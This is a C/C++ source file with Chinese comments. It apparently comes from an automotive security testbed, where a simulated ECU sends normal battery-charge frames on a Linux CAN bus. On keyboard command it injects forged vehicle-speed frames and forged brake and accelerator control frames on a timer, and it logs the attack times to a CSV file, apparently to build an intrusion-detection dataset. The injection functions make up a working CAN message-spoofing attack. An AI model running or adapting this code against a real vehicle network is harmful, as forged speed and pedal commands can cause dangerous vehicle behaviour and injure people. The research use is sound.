#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>             // socket通信相关, 函数原型         int socket(int af, int type, int protocol);
#include <sys/time.h>
#include <linux/can.h>              // Linux CAN 相关
#include <linux/can/raw.h>          // Linux CAN 相关
#include <termio.h>                 // 串口驱动头文件，扫描键盘事件相关
#include <pthread.h>
#include<arpa/inet.h>               // 网络地址簇


#include<iostream>
#include<string>
#include<memory>

#include "common.h"
#include "log.h"


// CAN 通信
static int s0;                              // socket通信相关，socket套接字
static struct sockaddr_can addr0;           // socket通信相关
static struct ifreq ifr0;                   // socket通信相关

// TCP 通信客户端
//static int client_fd;                       // 客户端套接字 
//static struct sockaddr_in client_addr;     // 客户端地址


static int g_attack_command;                // 攻击指令
static pthread_mutex_t mutex_attack_flag = PTHREAD_MUTEX_INITIALIZER;        //互斥线程锁及用宏定义初始化

static FILE* g_file_attack_record;          // 用于记录攻击时间
static int64_t g_soc_update_time = 0;        // 上一次电量更新时间
static vehicle_status_t g_vehicle_status_can0;    // CAN0 通道的车载状态
static pthread_mutex_t mutex_vehicle_status_can0 = PTHREAD_MUTEX_INITIALIZER;        //互斥线程锁及用宏定义初始化


// 实时接收CAN0报文
void *can0_receive(void *param)
{
    int nbytes;
    struct can_frame frame;
    
    memset(&frame, 0, sizeof(struct can_frame));

	struct thread_arg_t *arg = (struct thread_arg_t *)param; 
	
    while(arg->run) 
	{
        //printf("receiving can0 frame...");       
        //memset(&frame, 0, sizeof(frame));
        nbytes = read(s0, &frame, sizeof(frame));
		
        if(nbytes > 0) 
		{
			// 打印CAN报文
			//can_frame_show(&frame, CAN_CHANNEL_CAN0);

			// 解析报文
            pthread_mutex_lock(&mutex_vehicle_status_can0);
            parser_can_func(frame.can_id, &frame.data[0], &g_vehicle_status_can0);
			pthread_mutex_unlock(&mutex_vehicle_status_can0);

        }
        else 
		{
            LOG_DEBUG("no can frame received!");
        }
		
		select_sleep_us(10);
    }
    
	pthread_exit(NULL);
	
}


// ECU 3 非关键节点
int can_send_normal()
{
    if(g_vehicle_status_can0.auto_drive_flag == 0)
    {
        return 0;
    }

    int nbytes;
    struct can_frame frame;
    
    memset(&frame, 0, sizeof(struct can_frame));

    // 发送SOC 剩余电量
	frame.can_id = 0xC1;
	frame.can_dlc = 8;
	frame.data[0] = 0x00;
	frame.data[1] = 0x00;								  
	frame.data[2] = 0x00;
	frame.data[3] = 0x00;
	frame.data[4] = 0x00;
	frame.data[5] = 0x00;
	frame.data[6] = 0x00;
	frame.data[7] = 0x00;                           // 最后一位标记报文是否异常, 0-正常报文

    int64_t temp_time = get_system_ms_time();
	
	if(g_soc_update_time == 0)
	{
        g_soc_update_time = temp_time;
	}

	int64_t delta_time = temp_time - g_soc_update_time;
	g_soc_update_time = temp_time;

	pthread_mutex_lock(&mutex_vehicle_status_can0);
	g_vehicle_status_can0.bms_soc = g_vehicle_status_can0.bms_soc - (double)delta_time * 0.00001;
	double bms_soc = g_vehicle_status_can0.bms_soc;
	pthread_mutex_unlock(&mutex_vehicle_status_can0);

		
    data_to_can(bms_soc, &frame.data[0], 0, 16, 0.01, 0.0);

	// 发送报文
	nbytes = write(s0, &frame, sizeof(frame)); 
	if(nbytes != sizeof(frame)) 
	{
		// LOG_DEBUG("Send frame failed!");
	}
	else
	{
		// LOG_DEBUG("Send frame successful!");
		// can_frame_show(&frame);
	}

    vehicle_status_show(&g_vehicle_status_can0);
	
    return 0;
}


// 注入虚假速度
int can_send_injection_forged_speed(double forged_speed)
{
    if(g_attack_command != e_attack_inject)
    {
//        // 发送攻击时间
// 	    char data[1024] = {0};
//		memset(data, 0, sizeof(data));
//		snprintf(data + strlen(data), sizeof(data) - strlen(data), "%ld,%0X,%d", get_system_us_time(), 0x0B1, e_attack_free);     // 时间,ID,标记
//        //printf("%s\n", data);
//		write(client_fd, &data, strlen(data)); 
    
        return 0;
    }

    int nbytes;
    struct can_frame frame;
    
    memset(&frame, 0, sizeof(struct can_frame));

	frame.can_id = 0x0B1;
	frame.can_dlc = 8;
	frame.data[0] = 0x00;
	frame.data[1] = 0x00;								  
	frame.data[2] = 0x00;
	frame.data[3] = 0x00;
	frame.data[4] = 0x00;
	frame.data[5] = 0x00;
	frame.data[6] = 0x00;
	frame.data[7] = 0x00;

	data_to_can(forged_speed, &frame.data[0], 0, 16, (double)(1.0/256.0), 0.0);

	// 发送报文
	nbytes = write(s0, &frame, sizeof(frame)); 
	if(nbytes != sizeof(frame)) 
	{
		// LOG_DEBUG("Send frame failed!");
	}
	else
	{
	    // 记录攻击时间
        fprintf(g_file_attack_record, "%ld,%d\n", get_system_us_time(), 1);

//        // 发送攻击时间
// 	    char data[1024] = {0};
//		memset(data, 0, sizeof(data));
//		snprintf(data + strlen(data), sizeof(data) - strlen(data), "%ld,%0X,%d", get_system_us_time(), frame.can_id, e_attack_inject);     // 时间,ID,标记
//      printf("%s\n", data);
//		write(client_fd, &data, strlen(data));        

//		char szPrintInfo[512] = {0};
//		char szInfo[64] = {0};
//		
//		sprintf(szInfo, "%ld %08X", get_system_us_time(), frame.can_id);
//		strcat(szPrintInfo, szInfo);
//		
//		for (int i = 0; i < frame.can_dlc; ++i)
//		{
//			char szTemp[8] = {0};
//			sprintf(szTemp, " %02X", frame.data[i]);
//			strcat(szPrintInfo, szTemp);
//		}
//		LOG_DEBUG(RED "Send malicious frame successful! %s" NONE, szPrintInfo);
		//can_frame_show(&frame, 0);
	}

    return 0;
}


// 注入虚假的控制报文
int can_send_injection_forged_control(double acc, double brake)
{
    if(g_attack_command != e_attack_inject)
    {
        return 0;
    }

    int nbytes;
    struct can_frame frame;
    
    memset(&frame, 0, sizeof(struct can_frame));

	frame.can_id = 0x0A1;
	frame.can_dlc = 8;
	frame.data[0] = 0x00;
	frame.data[1] = 0x00;								  
	frame.data[2] = 0x00;
	frame.data[3] = 0x00;
	frame.data[4] = 0x00;
	frame.data[5] = 0x00;
	frame.data[6] = 0x00;
	frame.data[7] = 0x00;

	data_to_can(brake, &frame.data[0], 0, 16, 0.1, 0.0);                 // 制动踏板
	data_to_can(acc, &frame.data[0], 16, 16, 0.1, 0.0);          // 加速踏板

	// 发送报文
	nbytes = write(s0, &frame, sizeof(frame)); 
	if(nbytes != sizeof(frame)) 
	{
		// LOG_DEBUG("Send frame failed!");
	}
	else
	{
//		char szPrintInfo[512] = {0};
//		char szInfo[64] = {0};
//		
//		sprintf(szInfo, "%ld %08X", get_system_us_time(), frame.can_id);
//		strcat(szPrintInfo, szInfo);
//		
//		for (int i = 0; i < frame.can_dlc; ++i)
//		{
//			char szTemp[8] = {0};
//			sprintf(szTemp, " %02X", frame.data[i]);
//			strcat(szPrintInfo, szTemp);
//		}
//		LOG_DEBUG(RED "Send malicious frame successful! %s" NONE, szPrintInfo);	
		// LOG_DEBUG("Send frame successful!");
		// can_frame_show(&frame);
	}

    return 0;
}

// 初始化资源
int init(void)
{
	int ret;
	
    // 打开设备CAN0, 波特率500K
    system("sudo ip link set can0 type can bitrate 500000");
    system("sudo ifconfig can0 up");
	
    // 创建套接字 1.Create socket
    s0 = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s0 < 0) {
        perror("socket s0 PF_CAN failed");
        return 1;
    }

    // 2.Specify can device
    strcpy(ifr0.ifr_name, "can0");
    ret = ioctl(s0, SIOCGIFINDEX, &ifr0);
    if (ret < 0) {
        perror("ioctl failed");
        return 1;
    }


    // 3.Bind the socket to can
    addr0.can_family = AF_CAN;
    addr0.can_ifindex = ifr0.ifr_ifindex;
    ret = bind(s0, (struct sockaddr *)&addr0, sizeof(addr0));
    if (ret < 0) {
        perror("bind can0 failed");
        return 1;
    }

    // 设置接收超时时间 4.set receive timeout 
    struct timeval rcv_timeout = { 5, 0};   //{s, us}
    setsockopt(s0, SOL_SOCKET, SO_RCVTIMEO, (char*)&rcv_timeout, sizeof( struct timeval));

//    //TCP通信 1.创建套接字
//    client_fd = socket(AF_INET, SOCK_STREAM, 0);
//    if(client_fd==-1)
//    {
//        perror("socket");
//        return RET_ERROR;
//    }
//
//    //TCP通信 2.连接服务器
//    inet_pton(AF_INET, "192.168.1.105", &client_addr.sin_addr.s_addr);            // 监测单元ECU 5的IP地址为 192.168.1.105
//    client_addr.sin_family = AF_INET;
//    client_addr.sin_port = htons(9999);
//    ret = connect(client_fd, (struct sockaddr *)&client_addr, sizeof(client_addr));
//    if(ret==-1)
//    {
//        perror("tcp connet error");
//        return RET_ERROR;
//    }

    g_attack_command = e_attack_initial;

    if( access(DATA_PATH "attack_record.csv", F_OK)== 0)
    {
        if( remove(DATA_PATH "attack_record.csv") == 0)
        {
            LOG_DEBUG("remove" DATA_PATH "attack_record.csv");
        }

	}
	g_file_attack_record = fopen("../dataset/attack_record.csv", MODE_A_PLUS);

	memset(&g_vehicle_status_can0, 0, sizeof(struct vehicle_status_t));
	g_vehicle_status_can0.bms_soc = 100;

	
	return RET_OK;
	
}

// 释放资源
int deinit(void)
{
	// 关闭套接字和CAN设备 6.Close the socket and can0
    close(s0);
    system("sudo ifconfig can0 down");

    // TCP通信 关闭连接
    //close(client_fd);

    // 关闭文件
	fclose(g_file_attack_record);			  

    return RET_OK;
}


int main()
{
	int ret;
	
    // 资源初始化
	init();
	
    // 线程参数声明
    struct thread_arg_t can0_rcv_thread_arg;                        // can0报文接收线程

    // 线程ID声明
    pthread_t can0_rcv_thread_id;                                   // can0报文接收线程号

    // 创建can0报文接收线程
	can0_rcv_thread_arg.run = TRUE;
	ret = pthread_create(&can0_rcv_thread_id, NULL, can0_receive, &can0_rcv_thread_arg);
	if ( ret == 0) 
	{
		printf("create can0_receive thread successful \n");
	} 
	else
	{
		printf("create can0_receive thread failed! \n");
	}


	//周期性执行定时任务
	Timer t_send_normal;
	t_send_normal.StartTimer(ECU3_SEND_CYCLE, std::bind(can_send_normal));


	Timer t_send_injection;
	double injection_speed = 1.0;            // 0.01 0.1 1 10 50 
	//double forged_vehicle_velocity = 0;
	double forged_vehicle_velocity = 9.5;
	//double forged_vehicle_velocity = 30;
	t_send_injection.StartTimer(ECU2_SEND_CYCLE * injection_speed, std::bind(can_send_injection_forged_speed, forged_vehicle_velocity) );
	//t_send_injection.StartTimer(ECU1_SEND_CYCLE * injection_speed, std::bind(can_send_injection_forged_control, 2, 0) );

	// 获取键盘按键,根据键盘按键响应事件	(按a退出)
	while(1)
	{
		int res = scanKeyboard();
		printf("Keyboard_value: %d \n", res);
		
		if(res == 'a')
		{
		    break;
		}
		else
		{
		    pthread_mutex_lock(&mutex_attack_flag);
			// todo
            g_attack_command = res - '0';
			pthread_mutex_unlock(&mutex_attack_flag);
		}
		
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
	}

	// 退出报文接收线程
	can0_rcv_thread_arg.run = FALSE;
    pthread_join(can0_rcv_thread_id, NULL);

	std::cout << "try to expire timer!" << std::endl;
	t_send_normal.Expire();
	t_send_injection.Expire();


    // 释放资源
	deinit();
	
    return 0;
}
